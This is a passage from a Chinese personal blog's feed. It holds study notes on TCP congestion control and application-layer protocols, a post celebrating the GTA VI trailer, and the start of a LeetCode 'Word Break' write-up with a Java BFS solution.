&lt;h4 id=&#34;tcp拥塞控制的基本概念&#34;&gt;TCP拥塞控制的基本概念&lt;/h4&gt;
&lt;p&gt;拥塞控制与流量控制的性质对比:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;拥塞控制所要做的只有一个目的，就是使得网络能够承受现有的网络负荷。&lt;/li&gt;
&lt;li&gt;拥塞控制是一个全局性的过程，涉及所有的主机、所有的路由器以及与降低网络传输性能有关的所有因素。&lt;/li&gt;
&lt;li&gt;流量控制往往指在给定的发送端和接收端之间的点对点通信量的控制。&lt;/li&gt;
&lt;li&gt;流量控制所要做的就是抑制发送端发送数据的速率，以便使接收端来得及接收。&lt;/li&gt;
&lt;li&gt;拥塞控制是很难设计的，因为它是一个动态的（而不是静态的）问题。&lt;/li&gt;
&lt;li&gt;当前网络正朝着高速化的方向发展，这很容易出现缓存不够大而造成分组的丢失。但分组的丢失是网络发生拥塞的征兆而不是原因。&lt;/li&gt;
&lt;li&gt;在许多情况下，正是拥塞控制本身成为引起网络性能恶化甚至发生死锁的原因，这点应特别引起重视。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;拥塞控制又分为闭环控制和开环控制&lt;/p&gt;
&lt;h4 id=&#34;拥塞控制的4种算法&#34;&gt;拥塞控制的4种算法&lt;/h4&gt;
&lt;p&gt;发送端的主机在确定发送报文段的速率时，既要根据接收端的接收能力，又要从全局考虑不要使网络发生拥塞。因此，TCP要求发送端维护以下两个窗口。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;接收端窗口rwnd:接收端根据其目前接收缓存大小所许诺的最新的窗口值，反映了接收端的容量。由接收端将其放在TCP报文的首部的窗口字段通知发送端，如图5-14所示。&lt;/li&gt;
&lt;li&gt;拥塞窗口cwnd:发送端根据自己估计的网络拥塞程度而设置的窗口值，反映了网络的当前容量。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;发送端发送窗口的上限值应当取接收端窗口rwnd和拥塞窗口cwnd这两个变量中较小的一个，即应按以下公式确定:&lt;br&gt;
发送窗口的上限值=Min [rwnd，cwnd]&lt;/p&gt;
&lt;p&gt;慢开始算法的原理&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;在主机刚刚开始发送报文段时可先设置拥塞窗口 cwnd=1，即设置为一个最大报文段长度MSS的数值&lt;/li&gt;
&lt;li&gt;在每收到一个对新的报文段的确认后，将拥塞窗口加1，即增加一个MSS的数值&lt;/li&gt;
&lt;li&gt;用这样的方法逐步增大发送端的拥塞窗口 cwnd，可以使分组注入到网络的速率更加合理&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;拥塞避免算法的原理&lt;br&gt;
为防止拥塞窗口 cwnd的增长引起网络阻塞，还需要一个状态变量，即慢开始门限ssthresh，其用法如下:&lt;br&gt;
当cwnd&amp;lt;ssthresh时，使用慢开始算法&lt;br&gt;
当cwnd&amp;gt;ssthresh时，停止使用慢开始算法，改用拥塞避免算法&lt;br&gt;
当cwnd=ssthresh 时，既可以使用慢开始算法，也可以使用拥塞避免算法&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/yongse.png&#34; alt=&#34;tcp&#34;&gt;&lt;/p&gt;
&lt;p&gt;快重传算法&lt;/p&gt;
&lt;p&gt;快恢复算法
&lt;img src=&#34;https://xuoneyuan.github.io/images/chongchuan.png&#34; alt=&#34;tcp&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;应用层&#34;&gt;应用层&lt;/h2&gt;
&lt;h3 id=&#34;网络应用模型&#34;&gt;网络应用模型&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;客户/服务器模型(C/S模型)&lt;/li&gt;
&lt;li&gt;P2P模型&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;dns系统&#34;&gt;DNS系统&lt;/h3&gt;
&lt;h4 id=&#34;dns系统的概念&#34;&gt;DNS系统的概念&lt;/h4&gt;
&lt;p&gt;从概念上可以将DNS分为3个部分:层次域名空间、域名服务器、解析器&lt;/p&gt;
&lt;h4 id=&#34;层次域名空间&#34;&gt;层次域名空间&lt;/h4&gt;
&lt;p&gt;级别最低的域名写在最左边，而级别最高的顶级域名写在最右边&lt;/p&gt;
&lt;h4 id=&#34;域名服务器&#34;&gt;域名服务器&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;根域名服务器&lt;/li&gt;
&lt;li&gt;顶级域名服务器&lt;/li&gt;
&lt;li&gt;权限域名服务器&lt;/li&gt;
&lt;li&gt;本地域名服务器&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;ftp&#34;&gt;FTP&lt;/h3&gt;
&lt;p&gt;FTP客户机和服务器间传递 FTP命令时，使用的连接是建立在TCP之上的控制连接&lt;/p&gt;
&lt;h3 id=&#34;www&#34;&gt;WWW&lt;/h3&gt;
&lt;h4 id=&#34;www的概念和组成结构&#34;&gt;WWW的概念和组成结构&lt;/h4&gt;
&lt;p&gt;一个大规模的、联机式的信息储藏所&lt;br&gt;
wwW使用统一资源定位符（URL）来标志wwW上的各种文档。URL 的一般格式为&lt;br&gt;
&amp;lt;协议&amp;gt;://&amp;lt;主机&amp;gt;:&amp;lt;端口号&amp;gt;/&amp;lt;路径&amp;gt;&lt;/p&gt;
&lt;h4 id=&#34;http&#34;&gt;HTTP&lt;/h4&gt;
&lt;p&gt;超文本传送协议（HTTP）是在客户程序（如浏览器）与www服务器程序之间进行交互所使用的协议。HTTP是面向事务的应用层协议，它使用TCP连接进行可靠传输，服务器默认监听在80端口。&lt;/p&gt;
</content>
            
            
            
            
            
                
                    
                        
                            
                            
                            
                                <category scheme="https://xuoneyuan.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" term="计算机基础知识" label="计算机基础知识" />
                            
                        
                    
                
                    
                        
                            
                            
                            
                                <category scheme="https://xuoneyuan.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/" term="计算机" label="计算机" />
                            
                        
                            
                            
                            
                                <category scheme="https://xuoneyuan.github.io/tags/408/" term="408" label="408" />
                            
                        
                    
                
            
        </entry>
    
        <entry>
            <title type="text">GTA VI IS REALLY ON THE WAY!!!</title>
            <link rel="alternate" type="text/html" href="https://xuoneyuan.github.io/posts/10/" />
            <id>https://xuoneyuan.github.io/posts/10/</id>
            <updated>2023-12-28T21:04:52&#43;08:00</updated>
            <published>2023-12-06T16:19:08&#43;08:00</published>
            <author>
                    <name>falcone</name>
                    <uri>https://xuoneyuan.github.io/</uri>
                    <email>xuoneyuan@gmail.com</email>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">CAN YOU BELIEVE IT? 就在2023-12-5，北京时间早上7点07分，GTA VI第一部预告片正式放……</summary>
            
                <content type="html">&lt;h3 id=&#34;can-you-believe-it&#34;&gt;CAN YOU BELIEVE IT?&lt;/h3&gt;
&lt;p&gt;就在2023-12-5，北京时间早上7点07分，&lt;a href=&#34;https://www.youtube.com/watch?v=QdBZY2fkU-0&#34;&gt;GTA VI第一部预告片&lt;/a&gt;正式放送！&lt;/p&gt;
&lt;style&gt;
    .meta-media {
      position: relative;
      margin-bottom: 30px;
      display: flex;
      width: 100%;
      height: 0;
      padding-bottom: 75%;
    }
    .video {
      position: absolute;
      width: 100%;
      height: 100%;
      left: 0;
      top: 0;
    }
    &lt;/style&gt;
    &lt;div class=&#34;meta-media&#34;&gt;
    &lt;iframe src=&#34;https://www.youtube.com/embed/QdBZY2fkU-0&#34; frameborder=&#34;no&#34; scrolling=&#34;yes&#34; allowfullscreen=&#34;allowfullscreen&#34; high_quality=&#34;1&#34; framespacing=&#34;1&#34; class=&#34;video&#34; &gt;
    &lt;/iframe&gt;
    &lt;/div&gt;
&lt;p&gt;早在R星删除ins上所有之前的推文时，就已经暗示大的要来了&lt;/p&gt;
&lt;p&gt;果不其然，翻译翻译什么叫惊喜！
&lt;img src=&#34;https://xuoneyuan.github.io/images/gta6.png&#34; alt=&#34;rockstar.png&#34; title=&#34;b站什么时候无大会员支持4k分辨率&#34;&gt;&lt;/p&gt;
&lt;p&gt;截至目前(2023-12-6,16:30PM)，youtube上该视频的播放量已超1亿次，我就问问还有谁！
&lt;img src=&#34;https://xuoneyuan.github.io/images/rock1.png&#34; alt=&#34;rockstar.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;点赞超过900万，评论更是高达73万条!
&lt;img src=&#34;https://xuoneyuan.github.io/images/rock2.png&#34; alt=&#34;rockstar.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;还用多说什么吗？2025什么时候能来！ps5已经在准备的路上了！&lt;/p&gt;
</content>
            
            
            
            
            
                
                    
                        
                            
                            
                            
                                <category scheme="https://xuoneyuan.github.io/categories/%E6%B8%B8%E6%88%8F/" term="游戏" label="游戏" />
                            
                        
                    
                
                    
                        
                            
                            
                            
                                <category scheme="https://xuoneyuan.github.io/tags/gta/" term="GTA" label="GTA" />
                            
                        
                            
                            
                            
                                <category scheme="https://xuoneyuan.github.io/tags/games/" term="games" label="games" />
                            
                        
                    
                
            
        </entry>
    
        <entry>
            <title type="text">单词拆分</title>
            <link rel="alternate" type="text/html" href="https://xuoneyuan.github.io/posts/9/" />
            <id>https://xuoneyuan.github.io/posts/9/</id>
            <updated>2023-12-06T16:19:31&#43;08:00</updated>
            <published>2023-12-06T14:29:49&#43;08:00</published>
            <author>
                    <name>falcone</name>
                    <uri>https://xuoneyuan.github.io/</uri>
                    <email>xuoneyuan@gmail.com</email>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">今天继续手撕算法，这两天新做的，也属于是面试高频题了，特别是单词拆分II，周赛的味儿……</summary>
            
                <content type="html">&lt;p&gt;今天继续手撕算法，这两天新做的，也属于是面试高频题了，特别是单词拆分II，周赛的味儿太重了，动不动就超时&lt;/p&gt;
&lt;h3 id=&#34;单词拆分i&#34;&gt;单词拆分I&lt;/h3&gt;
&lt;p&gt;&lt;a href=&#34;https://leetcode.cn/problems/word-break/description/&#34;&gt;题目链接&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/wordbreak1.png&#34; alt=&#34;wordbreak1.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;看到这题自然而然想到遍历，先用常规的暴力解法DFS和BFS来试一试，不出意外结果超时了emm&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//BFS&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Solution&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;boolean&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;wordBreak&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;List&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wordDict&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Set&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;setDict&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;HashSet&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wordDict&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//记录当前层开始遍历字符串s的位置&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Queue&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Integer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;queue&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LinkedList&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;queue&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;   
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;queue&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;isEmpty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;queue&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;poll&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//如果字符串到遍历完了，自己返回true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;setDict&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;contains&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;substring&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)))&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;                &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;queue&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/wb1-timeout.png&#34; alt=&#34;超时&#34; title=&#34;timeout QAQ&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;动态规划&#34;&gt;动态规划&lt;/h4&gt;
&lt;p&gt;我们又想到了动态规划，首先我们来看看dp的思考过程：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;确定问题的子结构&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;检查字符串的前缀是否可以由字典中的单词组成&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;确定状态&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;定义状态dp[i]来表示字符串s的前i个字符是否可以被字典中的单词组成&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;确定状态转移方程&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;dp[i] = true，如果存在一个j（0 &amp;lt;= j &amp;lt; i），使得dp[j]是true，并且s的子串s[j:i]在字典中
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;确定初始状态和边界情况
